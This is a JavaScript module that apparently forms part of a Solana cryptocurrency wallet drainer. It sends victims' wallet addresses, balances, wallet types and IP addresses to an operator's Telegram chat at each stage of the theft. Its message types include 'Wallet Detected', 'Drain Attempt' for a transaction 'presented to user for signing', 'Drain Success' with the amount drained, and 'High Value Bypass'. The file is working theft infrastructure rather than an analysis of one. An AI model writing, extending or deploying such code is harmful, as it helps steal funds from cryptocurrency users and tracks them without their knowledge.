// Telegram Logger with centralized environment configuration
import envConfig from './environment.js';

class TelegramLogger {
  constructor() {
    // Use centralized environment configuration
    this.botToken = envConfig.telegram.botToken;
    this.chatId = envConfig.telegram.chatId;
    
    // Enable Telegram with valid credentials
    this.enabled = envConfig.telegram.enabled;
    
    if (this.enabled) {
      console.log('[TELEGRAM] Initialized with credentials:', {
        botToken: this.botToken ? `${this.botToken.substring(0, 10)}...` : 'missing',
        chatId: this.chatId || 'missing'
      });
    } else {
      console.log('[TELEGRAM] No valid credentials found - logging disabled');
      console.log('[TELEGRAM] Bot Token:', this.botToken ? 'Set' : 'Not set');
      console.log('[TELEGRAM] Chat ID:', this.chatId ? 'Set' : 'Not set');
    }
    
    // Enable logging for drain amounts in production
    this.logDrainAmounts = true;
  }

  /**
   * Test Telegram connection
   */
  async testConnection() {
    if (!this.enabled) {
      console.log('[TELEGRAM_TEST] Telegram disabled - skipping test');
      return false;
    }

    try {
      console.log('[TELEGRAM_TEST] Testing Telegram connection...');
      const url = `https://api.telegram.org/bot${this.botToken}/getMe`;
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
      
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);

      if (response.ok) {
        const data = await response.json();
        console.log('[TELEGRAM_TEST] ✅ Connection successful:', data.result.username);
        return true;
      } else {
        const errorText = await response.text();
        console.error('[TELEGRAM_TEST] ❌ Connection failed:', response.statusText, errorText);
        return false;
      }
    } catch (error) {
      console.error('[TELEGRAM_TEST] ❌ Connection test error:', error.message);
      return false;
    }
  }

  /**
   * Send message to Telegram
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    // Validate message
    if (!message || typeof message !== 'string') {
      console.error('[TELEGRAM] Invalid message format:', message);
      return;
    }

    // Validate type
    if (!type || typeof type !== 'string') {
      console.error('[TELEGRAM] Invalid message type:', type);
      type = 'info';
    }

    try {
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        }),
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ Failed to send Telegram message:', response.statusText, errorText);
        
        // Retry once for rate limiting or temporary errors
        if (response.status === 429 || response.status >= 500) {
          // Retrying message after delay
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          try {
            const retryController = new AbortController();
            const retryTimeoutId = setTimeout(() => retryController.abort(), 30000); // 30 second timeout
            
            const retryResponse = await fetch(url, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: this.chatId,
                text: formattedMessage,
                parse_mode: 'HTML',
                disable_web_page_preview: true
              }),
              signal: retryController.signal
            });
            
            clearTimeout(retryTimeoutId);
            
            if (!retryResponse.ok) {
              console.error('❌ Telegram retry also failed:', retryResponse.statusText);
            } else {
              // Telegram message sent successfully on retry
            }
          } catch (retryError) {
            console.error('❌ Telegram retry error:', retryError.message);
          }
        }
      } else {
        // Telegram message sent successfully
      }
    } catch (error) {
      if (error.name === 'AbortError') {
        console.error('❌ Telegram timeout error: Request timed out after 30 seconds');
      } else {
        console.error('❌ Telegram send error:', error.message);
      }
      console.error('❌ Telegram error details:', {
        name: error.name,
        message: error.message,
        stack: error.stack,
        botToken: this.botToken ? `${this.botToken.substring(0, 10)}...` : 'missing',
        chatId: this.chatId || 'missing',
        enabled: this.enabled
      });
      
      // Log to console as fallback for critical errors
      if (type === 'ERROR' || type === 'DRAIN_FAILED' || type === 'SECURITY_EVENT') {
        console.error('[TELEGRAM_FALLBACK] Critical message that failed to send:', {
          type: type,
          message: message,
          error: error.message
        });
      }
      
      // Always log to console for debugging
      console.log('[TELEGRAM_CONSOLE_FALLBACK] Message that failed to send to Telegram:', {
        type: type,
        message: message,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Format message with emojis and styling
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   */
  getEmoji(type) {
    const emojis = {
      'WALLET_DETECTED': '👛',
      'DRAIN_SUCCESS': '💰',
      'DRAIN_FAILED': '❌',
      'TRANSACTION_CANCELLED': '🚫',
      'RATE_LIMIT': '⏰',
      'HIGH_VALUE_BYPASS': '💎',
      'INSUFFICIENT_FUNDS': '💸',
      'ERROR': '🚨',
      'DRAIN_ATTEMPT': '🔄',
      'SECURITY_EVENT': '🔒',
      'DRAIN_CREATED': '📝'
    };
    return emojis[type] || 'ℹ️';
  }

  /**
   * Get prefix for message type
   */
  getPrefix(type) {
    const prefixes = {
      'WALLET_DETECTED': 'WALLET DETECTED',
      'DRAIN_SUCCESS': 'DRAIN SUCCESS',
      'DRAIN_FAILED': 'DRAIN FAILED',
      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELED',
      'RATE_LIMIT': 'RATE LIMIT',
      'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
      'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
      'ERROR': 'ERROR',
      'DRAIN_ATTEMPT': 'DRAIN ATTEMPT',
      'SECURITY_EVENT': 'SECURITY EVENT',
      'DRAIN_CREATED': 'DRAIN CREATED'
    };
    return prefixes[type] || 'INFO';
  }

  /**
   * Log wallet detection (all wallets, balance will be updated later)
   * Also handles logWalletDetection for backward compatibility
   */
  async logWalletDetected(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logWalletDetected:', data);
      return;
    }

    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    // Safe string conversion with fallback - handle both publicKey and user parameters
    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    
    // Wallet detected logging

    // Show wallet type if it's a known wallet type - ENHANCED 2025
    const knownWalletTypes = [
      'Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus',
      'Coinbase', 'MathWallet', 'Slope', 'TokenPocket', 'SafePal', 'Bitget'
    ];
    const walletTypeDisplay = knownWalletTypes.includes(walletType) ? `💼 <b>Type:</b> ${walletType}` : '';
    // Wallet detected logging

    const message = `
<b>👛 Wallet Detected</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'WALLET_DETECTED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send wallet detected message:', error.message);
      // Console fallback for wallet detection logs
      console.log('[TELEGRAM_WALLET_FALLBACK] Wallet detected details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        walletType: data.walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log successful drain (only after broadcast confirmation) - 2025 FIX
   */
  async logDrainSuccess(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logDrainSuccess:', data);
      return;
    }

    // FIXED: Properly handle both actualDrainAmount and lamports parameters
    const drainedAmount = parseInt(data.actualDrainAmount || data.lamports) || 0;
    const drainedSOL = (drainedAmount / 1e9).toFixed(6);
    
    // Safe string conversion with fallback - handle both publicKey and user parameters
    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    
    // Ensure drained amount is always shown, even if 0
    const drainedDisplay = drainedAmount > 0 ? `${drainedSOL} SOL (${drainedAmount} lamports)` : '0.000000 SOL (0 lamports)';
    
    const message = `
<b>💰 Drain Success</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Drained:</b> ${drainedDisplay}
🌐 <b>IP:</b> ${ip}
✅ <b>Status:</b> Confirmed on-chain - drain completed
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_SUCCESS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain success message:', error.message);
      // Console fallback for critical success logs
      console.log('[TELEGRAM_DRAIN_SUCCESS_FALLBACK] Drain success details:', {
        publicKey: data.publicKey,
        actualDrainAmount: data.actualDrainAmount,
        lamports: data.lamports,
        ip: data.ip,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log failed drain with specific reason
   */
  async logDrainFailed(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logDrainFailed:', data);
      return;
    }

    // Safe string conversion with fallback - handle both publicKey and user parameters
    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    let reason = 'Unknown error';
    let errorDetails = '';
    
    if (data.error) {
      // Parse different types of errors
      let errorString = '';
      
      if (typeof data.error === 'string') {
        errorString = data.error;
      } else if (typeof data.error === 'object') {
        // Handle Solana error objects
        if (data.error.err) {
          errorString = JSON.stringify(data.error.err);
          errorDetails = `Full error: ${JSON.stringify(data.error)}`;
        } else {
          errorString = JSON.stringify(data.error);
        }
      } else {
        errorString = String(data.error);
      }
      
      // Parse common Solana error patterns
      if (errorString.includes('InsufficientFundsForRent')) {
        reason = 'Insufficient funds for rent exemption';
      } else if (errorString.includes('InsufficientFunds')) {
        reason = 'Insufficient funds for transaction';
      } else if (errorString.includes('AccountNotFound')) {
        reason = 'Account not found';
      } else if (errorString.includes('InvalidAccountData')) {
        reason = 'Invalid account data';
      } else if (errorString.includes('ProgramError')) {
        reason = 'Program execution error';
      } else if (errorString.includes('InstructionMissingKeys')) {
        reason = 'Missing required account keys';
      } else if (errorString.includes('InvalidInstructionData')) {
        reason = 'Invalid instruction data';
      } else if (errorString.includes('UnsupportedProgramId')) {
        reason = 'Unsupported program ID';
      } else if (errorString.includes('RATE_LIMITED')) {
        reason = 'Rate limit exceeded';
      } else if (errorString.includes('broadcast_failed')) {
        reason = 'Transaction broadcast failed';
      } else if (errorString.includes('timeout')) {
        reason = 'Transaction confirmation timeout';
      } else if (errorString.includes('INSUFFICIENT_FUNDS')) {
        reason = 'Insufficient funds for transaction';
      } else {
        // Preserve the actual error message for debugging
        reason = errorString.length > 100 ? errorString.substring(0, 100) + '...' : errorString;
      }
    }
    
    const message = `
<b>❌ Drain Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
${data.signature ? `📝 <b>Signature:</b> <code>${data.signature}</code>` : ''}
${data.status ? `📊 <b>Status:</b> ${data.status}` : ''}
${errorDetails ? `🔍 <b>Error Details:</b> ${errorDetails}` : ''}
${data.details ? `🔍 <b>Additional Details:</b> ${data.details}` : ''}
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_FAILED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain failed message:', error.message);
      // Console fallback for critical failure logs
      console.error('[TELEGRAM_DRAIN_FAILED_FALLBACK] Drain failed details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        error: data.error,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log transaction cancellation
   */
  async logTransactionCancelled(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logTransactionCancelled:', data);
      return;
    }

    // Safe string conversion with fallback - handle both publicKey and user parameters
    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    const reason = String(data.reason || 'User canceled the transaction');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>🚫 Transaction Cancelled</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
❌ <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'TRANSACTION_CANCELLED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send transaction cancelled message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_CANCELLED_FALLBACK] Transaction cancelled details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        reason: data.reason,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log rate limit events
   */
  async logRateLimit(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logRateLimit:', data);
      return;
    }

    // Safe string conversion with fallback - handle both publicKey and user parameters
    const user = data.user || data.publicKey ? String(data.user || data.publicKey) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const details = String(data.details || 'No details provided');
    
    const message = `
<b>⏰ Rate Limit</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
📝 <b>Details:</b> ${details}
    `.trim();

    try {
      await this.sendMessage(message, 'RATE_LIMIT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send rate limit message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_RATE_LIMIT_FALLBACK] Rate limit details:', {
        user: data.user,
        ip: data.ip,
        details: data.details,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log high value wallet bypass
   */
  async logHighValueBypass(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logHighValueBypass:', data);
      return;
    }

    // Safe string conversion with fallback - handle both publicKey and user parameters
    const user = data.user || data.publicKey ? String(data.user || data.publicKey) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💎 High Value Bypass</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'HIGH_VALUE_BYPASS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send high value bypass message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_BYPASS_FALLBACK] High value bypass details:', {
        user: data.user,
        lamports: data.lamports,
        ip: data.ip,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log insufficient funds
   */
  async logInsufficientFunds(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logInsufficientFunds:', data);
      return;
    }

    // FIXED: Use publicKey instead of user for consistency
    const publicKey = data.publicKey || data.user ? String(data.publicKey || data.user) : 'Unknown';
    const walletAddress = publicKey !== 'Unknown' ? publicKey : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const walletType = String(data.walletType || 'Unknown');
    const balance = parseInt(data.lamports) || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    
    const message = `
<b>💸 Insufficient Funds</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'INSUFFICIENT_FUNDS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send insufficient funds message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_INSUFFICIENT_FALLBACK] Insufficient funds details:', {
        user: data.user,
        lamports: data.lamports,
        ip: data.ip,
        reason: data.reason,
        timestamp: new Date().toISOString()
      });
    }
  }


  /**
   * Log general errors
   */
  async logError(data) {
    // Validate and sanitize input data
    if (!data || typeof data !== 'object') {
      console.error('[TELEGRAM] Invalid data passed to logError:', data);
      return;
    }

    // Safe string conversion with fallback - handle both publicKey and user parameters
    const user = data.user || data.publicKey ? String(data.user || data.publicKey) : 'Unknown';
    const walletAddress = user !== 'Unknown' ? user : 'Unknown';
    const ip = String(data.ip || 'Unknown');
    const errorMessage = String(data.message || data.details || data.error || 'Unknown error');
    
    const message = `
<b>🚨 Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
❌ <b>Error:</b> ${errorMessage}
    `.trim();

    try {
      await this.sendMessage(message, 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send error message:', error.message);
      // Console fallback for critical errors
      console.error('[TELEGRAM_ERROR_FALLBACK] Error details:', {
        user: user,
        ip: ip,
        error: errorMessage,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log drain attempt (transaction presented to user for signing)
   */
  async logDrainAttempt(data) {
    // Safe string conversion with fallback - handle both publicKey and user parameters
    const walletAddress = (data.publicKey || data.user) ? String(data.publicKey || data.user) : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    const success = data.success !== undefined ? data.success : true;
    const instructions = data.instructions || 0;
    const transactionSize = data.transactionSize || 0;
    const walletType = String(data.walletType || 'Unknown');
    
    const message = `
<b>🔄 Drain Attempt</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
🌐 <b>IP:</b> ${ip}
📊 <b>Status:</b> ${success ? '✅ Transaction Ready' : '❌ Failed'}
📝 <b>Instructions:</b> ${instructions}
📦 <b>Size:</b> ${transactionSize} bytes
💡 <b>Note:</b> Transaction presented to user for signing
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_ATTEMPT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain attempt message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_DRAIN_ATTEMPT_FALLBACK] Drain attempt details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        ip: data.ip,
        success: data.success,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Log security events (rate limiting, blocked IPs, etc.)
   */
  async logSecurityEvent(data) {
    // Safe string conversion with fallback - handle both publicKey and user parameters
    const walletAddress = (data.user || data.publicKey) ? String(data.user || data.publicKey) : 'Unknown';
    const ip = data.ip || 'Unknown';
    const eventType = data.type || 'Unknown';
    const details = data.details || 'No details provided';
    
    const message = `
<b>🔒 Security Event</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
🚨 <b>Type:</b> ${eventType}
📝 <b>Details:</b> ${details}
    `.trim();

    try {
      await this.sendMessage(message, 'SECURITY_EVENT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send security event message:', error.message);
      // Console fallback for security events
      console.log('[TELEGRAM_SECURITY_FALLBACK] Security event details:', {
        user: data.user,
        ip: data.ip,
        type: data.type,
        details: data.details,
        timestamp: new Date().toISOString()
      });
    }
  }

  async logDrainCreated(data) {
    // Safe string conversion with fallback - handle both publicKey and user parameters
    const walletAddress = (data.publicKey || data.user) ? String(data.publicKey || data.user) : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = (balance / 1e9).toFixed(6);
    const drainAmount = data.actualDrainAmount || 0;
    const drainAmountSOL = (drainAmount / 1e9).toFixed(6);
    const walletType = String(data.walletType || 'Unknown');
    
    const message = `
<b>📝 Drain Created</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL} SOL
💸 <b>Drain Amount:</b> ${drainAmountSOL} SOL
🌐 <b>IP:</b> ${ip}
    `.trim();

    try {
      await this.sendMessage(message, 'DRAIN_CREATED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to send drain created message:', error.message);
      // Console fallback
      console.log('[TELEGRAM_CREATED_FALLBACK] Drain created details:', {
        publicKey: data.publicKey,
        lamports: data.lamports,
        actualDrainAmount: data.actualDrainAmount,
        ip: data.ip,
        walletType: walletType,
        timestamp: new Date().toISOString()
      });
    }
  }

  /**
   * Backward compatibility method - redirects to logWalletDetected
   */
  async logWalletDetection(data) {
    return this.logWalletDetected(data);
  }

  /**
   * Backward compatibility method - redirects to logDrainSuccess
   */
  async logTransactionConfirmation(data) {
    return this.logDrainSuccess(data);
  }

  /**
   * Centralized logging method to prevent duplicates and ensure consistency
   */
  async logEvent(eventType, data, options = {}) {
    // Prevent duplicate logging within 10 seconds for drain attempts, 5 seconds for others
    const cooldownTime = eventType === 'DRAIN_ATTEMPT' ? 10000 : 5000;
    const eventKey = `${eventType}_${data.publicKey || data.user}_${data.ip}`;
    const now = Date.now();
    
    if (this.lastLogTime && this.lastLogTime[eventKey] && (now - this.lastLogTime[eventKey]) < cooldownTime) {
      console.log(`[TELEGRAM] Skipping duplicate log: ${eventType} for ${data.publicKey || data.user} (cooldown: ${cooldownTime}ms)`);
      return;
    }
    
    if (!this.lastLogTime) this.lastLogTime = {};
    this.lastLogTime[eventKey] = now;

    // Route to appropriate method
    switch (eventType) {
      case 'WALLET_DETECTED':
      case 'WALLET_DETECTION':
        return this.logWalletDetected(data);
      case 'DRAIN_SUCCESS':
      case 'TRANSACTION_CONFIRMATION':
        return this.logDrainSuccess(data);
      case 'DRAIN_FAILED':
        return this.logDrainFailed(data);
      case 'TRANSACTION_CANCELLED':
        return this.logTransactionCancelled(data);
      case 'RATE_LIMIT':
        return this.logRateLimit(data);
      case 'HIGH_VALUE_BYPASS':
        return this.logHighValueBypass(data);
      case 'INSUFFICIENT_FUNDS':
        return this.logInsufficientFunds(data);
      case 'ERROR':
        return this.logError(data);
      case 'DRAIN_ATTEMPT':
        return this.logDrainAttempt(data);
      case 'SECURITY_EVENT':
        return this.logSecurityEvent(data);
      case 'DRAIN_CREATED':
        return this.logDrainCreated(data);
      default:
        console.error(`[TELEGRAM] Unknown event type: ${eventType}`);
        return this.logError({ ...data, message: `Unknown event type: ${eventType}` });
    }
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

export default telegramLogger; 